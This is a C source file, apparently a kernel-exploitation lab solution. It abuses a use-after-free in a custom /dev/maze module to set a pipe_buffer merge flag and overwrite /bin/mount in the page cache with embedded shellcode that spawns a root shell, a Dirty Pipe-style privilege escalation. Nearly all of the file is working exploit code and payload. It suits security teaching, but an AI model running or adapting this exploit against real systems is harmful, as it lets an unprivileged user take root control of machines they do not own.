#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

#define PAYLOAD_SZ 	0x400
#define ATTACK_FILE 	"/bin/mount\0"
#define READSZ		0x50
#ifndef PIPE_BUF_FLAG_CAN_MERGE
#define PIPE_BUF_FLAG_CAN_MERGE 0x10	/* can merge buffers */
#endif
/* ============================== Kernel stuff ============================== */

struct pipe_buffer {
	struct page *page;
	unsigned int offset;
	unsigned int len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};

/* 与内核模块中定义一致的用户态结构体 */
struct user_maze_t {
	char *buffer;
	size_t offset;
};

/* ========================================================================== */

int dev_fd, attack_fd, sync_pipe[2];
char gbuf[PAYLOAD_SZ];

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */

/**
/**
 * elf to pop root shell
*/
const char attack_data[] = {
        0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
        0x00, 0x56, 0x56, 0x56, 0x56, 0x00, 0x00, 0x00,
        0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
        0xb0, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
        0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,
        0x02, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
        0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x51, 0xe5, 0x74, 0x64, 0x07, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x31, 0xff, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x75,
        0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xd2, 0x31,
        0xf6, 0x6a, 0x77, 0x58, 0x0f, 0x05, 0x6a, 0x68,
        0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
        0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72,
        0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01,
        0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e,
        0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31,
        0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05
};

void hexprint(char *buffer, unsigned int bytes) 
{
	int dqwords = ((bytes + 0x10 - 1)&0xfffffff0) / 0x10;
	int qwords = dqwords * 2;
	for (int i = 0; i < qwords; i+=2) {
		printf("0x%04x: 0x%016llx 0x%016llx\n", (i * 0x8), ((unsigned long long*)buffer)[i], ((unsigned long long*)buffer)[i+1]);
	}
	puts("-----------------------------------------------");
	return;
}

void read_file(char *file, off_t offset)
{
	printf("see content of %s\n", file);
	lseek(attack_fd, offset, SEEK_SET);
	read(attack_fd, gbuf, READSZ);
	hexprint(gbuf, READSZ);
}

int init_forge_uaf()
{
	/* Fill your code here */
	/* Forge a use-after-free object */
	dev_fd = open("/dev/maze", O_RDWR);
	if (dev_fd < 0) {
		perror("[-] open /dev/maze");
		return EXIT_FAILURE;
	}
	printf("[+] Open /dev/maze: fd=%d\n", dev_fd);

	// Alloc maze.buf
	if (ioctl(dev_fd, 0x40001, 0) < 0) {
		perror("[-] ioctl MAZE_ACT_ALLOC");
		return EXIT_FAILURE;
	}
	printf("[+] Allocated maze buffer\n");

	// Free maze.buf but not reset
	if (ioctl(dev_fd, 0x40003, 0) < 0) {
		perror("[-] ioctl MAZE_ACT_FREE");
		return EXIT_FAILURE;
	}
	printf("[+] Freed maze buffer, but pointer still exists (UAF)\n");

	return EXIT_SUCCESS;
}

int exploit()
{
	/* Fill your code here */
	/* open the attack file and validate the specified offset */
	attack_fd = open(ATTACK_FILE, O_RDONLY);
	if (attack_fd < 0) {
		perror("[-] open attack file");
		return EXIT_FAILURE;
	}
	printf("[+] Opened attack file: %s\n", ATTACK_FILE);
	
	/* Fill your code here */
	// 1. alloc pipe_buffer to occpy the UAF hole
	int p[2];
	if (pipe(p) < 0) {
		perror("[-] pipe");
		return EXIT_FAILURE;
	}
	printf("[+] Created pipe: p[0]=%d, p[1]=%d\n", p[0], p[1]);
	
	// mount elf offset
	off_t offset = 1;

	/* Fill your code here */
	/**
	 * 2. splice data to/from a pipe
	 * It transfers len bytes of data from the file descriptor fd_in to fd_out
	*/
	if (splice(attack_fd, &offset, p[1], NULL, 1, 0) < 0) {
		perror("[-] splice");
		return EXIT_FAILURE;
	}
	printf("[+] Spliced 1 byte from attack file to pipe\n");

	// check the original content of attack file
	read_file(ATTACK_FILE, offset);

	/* Fill your code here */
	// 3. UAF edit pipe_buffer to set PIPE_BUF_FLAG_CAN_MERGE flag
	struct user_maze_t user_maze;
	char flag_val = PIPE_BUF_FLAG_CAN_MERGE;
	
	// 计算pipe_buffer结构体中flags成员的偏移，通常为16字节
	// struct pipe_buffer {
	//   struct page *page;     // 8 bytes
	//   unsigned int offset;   // 4 bytes
	//   unsigned int len;      // 4 bytes
	//   const struct pipe_buf_operations *ops; // 8 bytes
	//   unsigned int flags;    // 4 bytes - 这是我们要修改的
	//   ...
	// }
	size_t flags_offset = 16 + 8; // 假设flags在结构体中的偏移是24字节
	
	user_maze.buffer = &flag_val;
	user_maze.offset = flags_offset;
	
	if (ioctl(dev_fd, 0x40002, &user_maze) < 0) {
		perror("[-] ioctl MAZE_ACT_EDIT");
		return EXIT_FAILURE;
	}
	printf("[+] Set pipe_buffer->flags to PIPE_BUF_FLAG_CAN_MERGE\n");

	/* Fill your code here */
	/**
	 * 4. the following write will not create a new pipe_buffer, 
	 * but will instead write into the page cache, 
	 * because of the PIPE_BUF_FLAG_CAN_MERGE flag
	*/
	if (write(p[1], attack_data, sizeof(attack_data)) < 0) {
		perror("[-] write to pipe");
		return EXIT_FAILURE;
	}
	printf("[+] Wrote %ld bytes of shellcode to pipe\n", sizeof(attack_data));

	// check the new content of attack file
    read_file(ATTACK_FILE, offset);
    
    // 关闭文件描述符
    close(p[0]);
    close(p[1]);
    close(attack_fd);
    
    return EXIT_SUCCESS;
}


int main(void)
{
	int ret;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
	pipe(sync_pipe);

        if (!fork()) {
		if (init_forge_uaf() == EXIT_FAILURE)
			goto end;
		else
			printf("[+] Prepare is ready\n");

                if (exploit() == EXIT_FAILURE)
			goto end;
		else
			printf("[+] Exploit success\n");

                write(sync_pipe[1], "T", 1);
                while (1) sleep(10);
end:
		if (dev_fd >= 0)
			if (close(dev_fd) != 0) 
				perror("[-] close dev_fd");
		write(sync_pipe[1], "F", 1);
        } else {
                char sync;
                read(sync_pipe[0], &sync, 1);
                if (sync == 'T') {
			printf("Now we can trigger shutdown\n");
			printf("And get root shell\n");
                } else {
			printf("exploit failed\n");
			return EXIT_FAILURE;
		}
        }

	return EXIT_SUCCESS;
}
